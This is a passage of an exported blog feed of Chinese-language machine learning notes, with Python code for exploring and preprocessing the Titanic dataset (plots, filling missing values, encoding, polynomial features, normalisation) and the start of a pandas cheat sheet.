<span class="hljs-built_in">range</span>(length):<br>        <span class="hljs-keyword">for</span> a_width <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>            ax = fig.add_subplot(grid[a_width,a_len])<br>            index = a_len * length + a_width<br>            <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(labels):<br>                label = labels[index]<br>                result = df[[label,target]].groupby(<br>                    label,<br>                    as_index=<span class="hljs-literal">False</span><br>                ).mean().sort_values(<br>                    by=target, ascending=<span class="hljs-literal">False</span><br>                )<br>                <span class="hljs-built_in">print</span>(result)<br>                sns.lineplot(ax=ax,x=result[label], y=result.Survived)<br>    plt.tight_layout()<br>    plt.show()<br><br><span class="hljs-comment"># 多个标签与结果</span><br><br><span class="hljs-comment"># x代表离散点,y值代表分布,hue为两条曲线的对比 col为多个标签</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_label_pointplot</span>(<span class="hljs-params">df, col=<span class="hljs-literal">None</span>, row=<span class="hljs-literal">None</span>, x=<span class="hljs-literal">None</span>, y=<span class="hljs-literal">None</span>, hue=<span class="hljs-literal">None</span>,change_x=<span class="hljs-literal">False</span></span>):<br>    grid = sns.FacetGrid(df, col=col,row=row)<br>    <span class="hljs-comment"># 长度表示标准差，点表示均值</span><br>    grid.<span class="hljs-built_in">map</span>(sns.pointplot, x, y, hue=hue, palette=<span class="hljs-string">&#x27;deep&#x27;</span>,dodge=<span class="hljs-literal">True</span>)<br>    grid.add_legend()<br>    plt.tight_layout()<br>    <span class="hljs-keyword">if</span> change_x == <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> ax <span class="hljs-keyword">in</span> grid.axes.flat:<br>            plt.setp(ax.get_xticklabels(), rotation=<span class="hljs-number">30</span>, horizontalalignment=<span class="hljs-string">&#x27;right&#x27;</span>, fontsize=<span class="hljs-string">&#x27;x-small&#x27;</span>)<br>    plt.show()<br></code></pre></td></tr></table></figure><h3 id="连续数值">连续数值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 枚举行和列的标签下目标数值的分布</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_num_hist</span>(<span class="hljs-params">df, targets, col=<span class="hljs-literal">None</span>, row=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">for</span> target <span class="hljs-keyword">in</span> targets:<br>        g = sns.FacetGrid(df, col=col, row=row)<br>        g.<span class="hljs-built_in">map</span>(plt.hist,target, bins=<span class="hljs-number">20</span>)<br>        plt.show()<br><br><span class="hljs-comment"># 方式一 观察不同标签下目标的分布情况</span><br><span class="hljs-comment"># 方式二 观察不同目标（band)下标签的分布情况 -&gt; 转换为label plot</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_num_barplot</span>(<span class="hljs-params">df, col=<span class="hljs-literal">None</span>, row=<span class="hljs-literal">None</span>, x=<span class="hljs-literal">None</span>, y=<span class="hljs-literal">None</span>, hue=<span class="hljs-literal">None</span>,ci=<span class="hljs-literal">None</span></span>):<br>    grid = sns.FacetGrid(df,col=col,row=row)<br>    <span class="hljs-comment"># ci = False 不显示标准差</span><br>    grid.<span class="hljs-built_in">map</span>(sns.barplot,x,y,hue=hue,ci=ci)<br>    grid.add_legend()<br>    plt.show()<br><br><span class="hljs-comment"># 表示密度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_num_violinplot</span>(<span class="hljs-params">df, col=<span class="hljs-literal">None</span>, row=<span class="hljs-literal">None</span>, x=<span class="hljs-literal">None</span>, y=<span class="hljs-literal">None</span>, hue=<span class="hljs-literal">None</span>,ci=<span class="hljs-literal">None</span></span>):<br>    grid = sns.FacetGrid(df,col=col,row=row)<br>    grid.<span class="hljs-built_in">map</span>(sns.violinplot,x,y,hue=hue)<br>    grid.add_legend()<br>    plt.show()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">num_to_label</span>(<span class="hljs-params">df,num_column,bins=<span class="hljs-number">5</span></span>):<br>    length = <span class="hljs-built_in">int</span>(np.sqrt(<span class="hljs-built_in">len</span>(num_column))) + <span class="hljs-number">1</span><br>    fig = plt.figure()<br>    grid = gridspec.GridSpec(length,length,fig)<br>    <span class="hljs-keyword">for</span> a_len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        <span class="hljs-keyword">for</span> a_width <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>            ax = fig.add_subplot(grid[a_width,a_len])<br>            index = a_len * length + a_width<br>            <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(num_column):<br>                new_column_name = num_column[index] + <span class="hljs-string">&#x27;Band&#x27;</span><br>                df[new_column_name] = pd.qcut(df[num_column[index]],bins)<br>                sns.pointplot(data=df,ax=ax, x=new_column_name, y=<span class="hljs-string">&#x27;Survived&#x27;</span>)<br>                plt.setp(<br>                    ax.get_xticklabels(),<br>                    rotation=<span class="hljs-number">30</span>,<br>                    horizontalalignment=<span class="hljs-string">&#x27;right&#x27;</span>,<br>                    fontsize=<span class="hljs-string">&#x27;x-small&#x27;</span><br>                )<br>    plt.tight_layout()<br>    plt.show()<br></code></pre></td></tr></table></figure><h3 id="string">String</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 根据pattern提取特征</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_str_labels</span>(<span class="hljs-params">df,column,labels</span>):<br>    <span class="hljs-keyword">for</span> label <span class="hljs-keyword">in</span> labels:<br>    <span class="hljs-comment"># 求frequency</span><br>        <span class="hljs-built_in">print</span>(<br>            pd.crosstab(<br>                df[column], df[label]<br>            ).apply(<br>                <span class="hljs-keyword">lambda</span> r: r/r.<span class="hljs-built_in">sum</span>(), axis=<span class="hljs-number">1</span><br>            )<br>        )        <br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_str_dist</span>(<span class="hljs-params">df,str_columns,patterns,labels</span>):<br>    <span class="hljs-keyword">for</span> str_column,pattern <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(str_columns,patterns):<br>        new_column = str_column + <span class="hljs-string">&#x27;Type&#x27;</span><br>        df.loc[:,new_column] = df[str_column].<span class="hljs-built_in">str</span>.extract(<br>            pattern,<br>            expand=<span class="hljs-literal">False</span><br>        )<br>        <span class="hljs-built_in">print</span>(df[new_column].value_counts(normalize=<span class="hljs-literal">True</span>))<br>        show_str_labels(df,new_column,labels)<br>        <br><span class="hljs-comment"># 将nan与其他分开</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_str_nan</span>(<span class="hljs-params">df,str_columns</span>):<br>    <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> str_columns:<br>        new_column = column + <span class="hljs-string">&#x27;Type&#x27;</span><br>        df[new_column] = df[column]<br>        df.loc[<br>            df[new_column].notnull(),new_column<br>        ] = <span class="hljs-string">&#x27;cabin&#x27;</span><br>        df[new_column].fillna(<span class="hljs-string">&#x27;None&#x27;</span>,inplace=<span class="hljs-literal">True</span>)<br>        show_str_labels(df,<span class="hljs-string">&#x27;CabinType&#x27;</span>,[<span class="hljs-string">&#x27;Survived&#x27;</span>])<br></code></pre></td></tr></table></figure><h3 id="process">Process</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 查看特征</span><br><br><span class="hljs-comment"># 确定数据类型</span><br>show_basic(cat_df)<br><br>cat_columns(cat_df)<br><br>label_column = [<br>    <span class="hljs-string">&#x27;Pclass&#x27;</span>, <span class="hljs-string">&#x27;Embarked&#x27;</span>,<span class="hljs-string">&#x27;SibSp&#x27;</span>,<br>    <span class="hljs-string">&#x27;Parch&#x27;</span>, <span class="hljs-string">&#x27;Sex&#x27;</span>,<br>]<br><br>num_column = [<br>    <span class="hljs-string">&#x27;Fare&#x27;</span>, <span class="hljs-string">&#x27;PassengerId&#x27;</span>, <span class="hljs-string">&#x27;Age&#x27;</span><br>]<br><br>band_column = [<br>    <span class="hljs-string">&#x27;FareBand&#x27;</span>, <span class="hljs-string">&#x27;PassengerIdBand&#x27;</span>, <span class="hljs-string">&#x27;AgeBand&#x27;</span><br>]<br><br>str_column = [<br>    <span class="hljs-string">&#x27;Name&#x27;</span>,<span class="hljs-string">&#x27;Cabin&#x27;</span><br>]<br><br>type_column = [<br>    <span class="hljs-string">&#x27;NameType&#x27;</span>,<span class="hljs-string">&#x27;CabinType&#x27;</span>            <br>]<br><br><span class="hljs-comment"># 确定标签分布</span><br>show_label_distributions(cat_df,label_column,<span class="hljs-string">&#x27;Survived&#x27;</span>)<br><br><span class="hljs-comment"># 数值分布特点（补nan）</span><br>show_num_hist(cat_df,num_column)<br>show_num_hist(cat_df,[<span class="hljs-string">&#x27;Age&#x27;</span>],col=<span class="hljs-string">&#x27;Pclass&#x27;</span>,row=<span class="hljs-string">&#x27;Survived&#x27;</span>)<br><br><span class="hljs-comment"># 添加新标签</span><br>cat_df[<span class="hljs-string">&#x27;family&#x27;</span>] = cat_df[<span class="hljs-string">&#x27;SibSp&#x27;</span>] + cat_df[<span class="hljs-string">&#x27;Parch&#x27;</span>]<br>new_column = label_column + [<span class="hljs-string">&#x27;family&#x27;</span>]<br>show_label_distributions(cat_df,new_column,<span class="hljs-string">&#x27;Survived&#x27;</span>)<br>cat_df.drop(<span class="hljs-string">&#x27;family&#x27;</span>,axis=<span class="hljs-number">1</span>,inplace=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 查看数值与目标的关系</span><br>show_num_violinplot(cat_df,x=<span class="hljs-string">&#x27;Survived&#x27;</span>,y=<span class="hljs-string">&#x27;Age&#x27;</span>)<br>show_num_violinplot(cat_df,x=<span class="hljs-string">&#x27;Survived&#x27;</span>,y=<span class="hljs-string">&#x27;Fare&#x27;</span>)<br>show_num_violinplot(cat_df,x=<span class="hljs-string">&#x27;Survived&#x27;</span>,y=<span class="hljs-string">&#x27;PassengerId&#x27;</span>)<br><br><span class="hljs-comment"># 转标签</span><br>num_to_label(cat_df,[<span class="hljs-string">&#x27;Age&#x27;</span>,<span class="hljs-string">&#x27;Fare&#x27;</span>,<span class="hljs-string">&#x27;PassengerId&#x27;</span>])<br><br><span class="hljs-comment"># 字符串匹配</span><br>patterns = [<span class="hljs-string">&#x27; ([A-Za-z]+)\.&#x27;</span>]<br>columns = label_column + band_column<br>show_str_dist(cat_df,[<span class="hljs-string">&#x27;Name&#x27;</span>],patterns,columns)<br><br><span class="hljs-comment"># 字符串0-1</span><br>show_str_nan(cat_df,[<span class="hljs-string">&#x27;Cabin&#x27;</span>])<br>columns = [<span class="hljs-string">&#x27;Survived&#x27;</span>]<br>show_label_pointplot(cat_df,x=<span class="hljs-string">&#x27;CabinType&#x27;</span>,y=<span class="hljs-string">&#x27;Survived&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="改进数据">改进数据</h2><h3 id="data-mismatch">data-mismatch</h3><p>只需要判断模糊数据 但大部分数据是清晰的 语音识别中的特定的应用场景dev 和 test 采用模糊数据 训练集大部分清晰 小部分模糊 增加train-dev set查看造成variance的原因</p><p>人工分析dev数据与train数据的 添加噪音...(artificial data synthesis)问题 反复的重复导致对噪音的过拟合</p><h3 id="填充">填充</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 填充 </span><br><span class="hljs-comment"># 根据正态分布</span><br><span class="hljs-comment"># 填充年龄        </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill_age_mean</span>(<span class="hljs-params">df</span>):<br>    <span class="hljs-comment"># fig,axs = plt.subplots(1,2,sharey=True)</span><br>    <span class="hljs-comment"># show_hist(axs[0],df[&#x27;Age&#x27;])</span><br>    mean_age = df[<span class="hljs-string">&#x27;Age&#x27;</span>].mean()<br>    std_age = df[<span class="hljs-string">&#x27;Age&#x27;</span>].std()<br>    max_age = df.Age.<span class="hljs-built_in">max</span>()<br>    min_age = df.Age.<span class="hljs-built_in">min</span>()<br>    np.random.seed(seed=<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># print(len(df.loc[df.Age == 0, &#x27;Age&#x27;]))</span><br>    df.loc[:, <span class="hljs-string">&#x27;Age&#x27;</span>] = df.loc[:, <span class="hljs-string">&#x27;Age&#x27;</span>].apply(<br>        <span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(generate_randn(<br>            mean_age,<br>            std_age,<br>            max_age,<br>            min_age<br>        )) <span class="hljs-keyword">if</span> np.isnan(x) <span class="hljs-keyword">else</span> x<br>    )<br>    <span class="hljs-comment"># show_hist(axs[1], df[&#x27;Age&#x27;])</span><br>    <span class="hljs-comment"># plt.show()</span><br>    <span class="hljs-keyword">return</span> df<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill_age_split</span>(<span class="hljs-params">df</span>):<br>    df.loc[:,<span class="hljs-string">&#x27;Sex_cat&#x27;</span>].replace(&#123;<span class="hljs-string">&#x27;female&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;male&#x27;</span>:<span class="hljs-number">0</span>&#125;,inplace=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>):<br>            part_df = df.loc[(df[<span class="hljs-string">&#x27;Sex_cat&#x27;</span>] == i) &amp; \<br>                            (df[<span class="hljs-string">&#x27;Pclass&#x27;</span>] == j+<span class="hljs-number">1</span>),[<span class="hljs-string">&#x27;Age&#x27;</span>]]<br>            part_df = fill_age_mean(part_df)<br>            df.update(part_df)<br>    <span class="hljs-keyword">return</span> df<br><br><span class="hljs-comment"># 根据频率</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill_embarked</span>(<span class="hljs-params">df</span>):<br>    freq_port = df.Embarked.dropna().mode()[<span class="hljs-number">0</span>]<br>    df[<span class="hljs-string">&#x27;Embarked&#x27;</span>] = df[<span class="hljs-string">&#x27;Embarked&#x27;</span>].fillna(freq_port)<br>    <span class="hljs-keyword">return</span> df <br>    <br><span class="hljs-comment"># 根据中位数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill_fare</span>(<span class="hljs-params">df</span>):<br>    df[<span class="hljs-string">&#x27;Fare&#x27;</span>].fillna(df[<span class="hljs-string">&#x27;Fare&#x27;</span>].dropna().median(), inplace=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> df<br></code></pre></td></tr></table></figure><h3 id="平方项">平方项</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 增加平方或交互项</span><br><span class="hljs-comment"># 顺序 1，x,y,z,x^2,xy,xz,y^2,yz...</span><br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> PolynomialFeatures<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_polynomial</span>(<span class="hljs-params">df</span>):<br>    columns = [<br>        <span class="hljs-string">&#x27;Age&#x27;</span>, <span class="hljs-string">&#x27;SibSp&#x27;</span>, <span class="hljs-string">&#x27;Parch&#x27;</span>, <span class="hljs-string">&#x27;Fare&#x27;</span>,<br>    ]<br>    poly = PolynomialFeatures(<span class="hljs-number">2</span>)<br>    t = poly.fit_transform(df[columns])<br>    new_columns = [<br>        <span class="hljs-string">&#x27;A_2&#x27;</span>, <span class="hljs-string">&#x27;A_S&#x27;</span>, <span class="hljs-string">&#x27;A_P&#x27;</span>, <span class="hljs-string">&#x27;A_F&#x27;</span>, <span class="hljs-string">&#x27;S_2&#x27;</span>,<br>        <span class="hljs-string">&#x27;S_P&#x27;</span>, <span class="hljs-string">&#x27;S_F&#x27;</span>, <span class="hljs-string">&#x27;P_2&#x27;</span>, <span class="hljs-string">&#x27;P_F&#x27;</span>, <span class="hljs-string">&#x27;F_2&#x27;</span><br>    ]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">15</span>):<br>        df.loc[:,new_columns[i-<span class="hljs-number">5</span>]] = t[:,i]<br>    <span class="hljs-keyword">return</span> df<br></code></pre></td></tr></table></figure><h3 id="编码">编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># label encoder</span><br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> LabelEncoder<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code_label_columns</span>(<span class="hljs-params">df,columns</span>):<br>    <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> columns:<br>        column_name = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;column&#125;</span>_cat&quot;</span><br>        df.loc[:,column] = df[column].astype(<span class="hljs-string">&#x27;category&#x27;</span>)<br>        df[column_name] = df[column].cat.codes    <br>    <span class="hljs-keyword">return</span> df<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code_hot_columns</span>(<span class="hljs-params">df,columns</span>):<br>    <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> columns:<br>        prefix = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;column&#125;</span>_Type&quot;</span><br>        code_df = pd.get_dummies(<br>            df[[column]], columns=[column], prefix=[prefix] <br>        )<br>        df=df.join(code_df)<br>    <span class="hljs-keyword">return</span> df<br></code></pre></td></tr></table></figure><h3 id="忽略">忽略</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 忽略部分列</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ignore_columns</span>(<span class="hljs-params">df,columns</span>):<br>    df.drop(columns, axis=<span class="hljs-number">1</span>, inplace=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> df<br></code></pre></td></tr></table></figure><h3 id="标准归一">标准/归一</h3><p>不标准化导致学习率不好确定 -&gt; 不利于梯度下降</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> StandardScaler<br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> Normalizer<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">normal</span>(<span class="hljs-params">df,column_list</span>):<br>    column_list = [column <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> column_list <span class="hljs-keyword">if</span> column <span class="hljs-keyword">in</span> df.columns]<br>    df.loc[:,column_list] = Normalizer().fit_transform(df.loc[:,column_list])<br>    <span class="hljs-keyword">return</span> df<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Machine Learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pandas basic</title>
    <link href="/2021/12/12/pd/"/>
    <url>/2021/12/12/pd/</url>
    
    <content type="html"><![CDATA[<h1 id="pandas">Pandas</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br></code></pre></td></tr></table></figure><h2 id="cat">cat</h2><h3 id="basic">basic</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">df.loc[<span class="hljs-string">&#x27;a&#x27;</span>], df[<span class="hljs-string">&#x27;a&#x27;</span>], df.at() ,df[[<span class="hljs-string">&#x27;a&#x27;</span>]](<span class="hljs-keyword">as</span> dataframe)<br><span class="hljs-comment"># iloc series df.iloc[-1,] too many index</span><br>df.iloc[<span class="hljs-number">1</span>] , df[[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]], df.iat()<br>df.head() , df.tail(), df.sample(n=<span class="hljs-number">1</span>)<br>df.shape(), <span class="hljs-built_in">len</span>(df.columns),<br><span class="hljs-comment"># 最近n天</span><br>df.rolling()<br><span class="hljs-comment"># 至今 </span><br>df.expanding()<br><span class="hljs-comment"># -a 下a行</span><br>df.shift()<br><span class="hljs-comment">#type</span><br>df.dtypes()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_basic</span>(<span class="hljs-params">df</span>):<br>    <span class="hljs-built_in">print</span>(df.columns)<br>    <span class="hljs-comment"># type and nums</span><br>    <span class="hljs-built_in">print</span>(df.info())<br>    <span class="hljs-comment"># unique of type</span><br>    <span class="hljs-built_in">print</span>(df.describe(include=<span class="hljs-string">&#x27;O&#x27;</span>))<br>    <span class="hljs-comment"># 查看最常见的值</span><br>    <span class="hljs-built_in">print</span>(df.mode())<br>    <span class="hljs-comment"># series -&gt; 增加25-75</span><br>    <span class="hljs-built_in">print</span>(df.describe())<br>    <br><span class="hljs-comment"># 分别查看每一列的数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat_df</span>(<span class="hljs-params">df</span>):<br>    <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(df.columns):<br>        <span class="hljs-built_in">print</span>(df[column].head(<span class="hljs-number">5</span>))<br><br><span class="hljs-comment"># 查看相关系数矩阵</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat_cov</span>(<span class="hljs-params">df</span>):<br>    fig,ax = plt.subplots()<br>    matrix = df.corr()<br>    ax = sns.heatmap(matrix)<br>    plt.show()   <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_unique</span>(<span class="hljs-params">df</span>):<br><span class="hljs-comment"># 沿着axis查看有多少unique</span><br><span class="hljs-comment"># 查看每列的类型数</span><br>    df.nunique(axis=<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">len</span>(pd.unique(series))<br><br><span class="hljs-comment"># equal</span><br>df.equals(exactly_equal)<br></code></pre></td></tr></table></figure><h3 id="print-option">print option</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">pd.set_option(<span class="hljs-string">&#x27;max_rows&#x27;</span>, <span class="hljs-number">100</span>)<br>pd.set_option(<span class="hljs-string">&quot;max_columns&quot;</span>, <span class="hljs-number">50</span>)<br><span class="hljs-comment"># 一直延申</span><br>pd.set_option(<span class="hljs-string">&quot;expand_frame_repr&quot;</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h3 id="condition">condition</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># dict </span><br>dp[<span class="hljs-string">&#x27;wts&#x27;</span>][dict_.keys()] = dict_.values()<br><span class="hljs-comment"># 保留非nan </span><br>dp = dp[~np.isnan(dp[<span class="hljs-string">&#x27;wts&#x27;</span>])]<br><span class="hljs-comment"># select column </span><br>df.<span class="hljs-built_in">filter</span>(regex=(<span class="hljs-string">&quot;d.*&quot;</span>))<br><span class="hljs-comment"># loc </span><br>df.loc[mask,<span 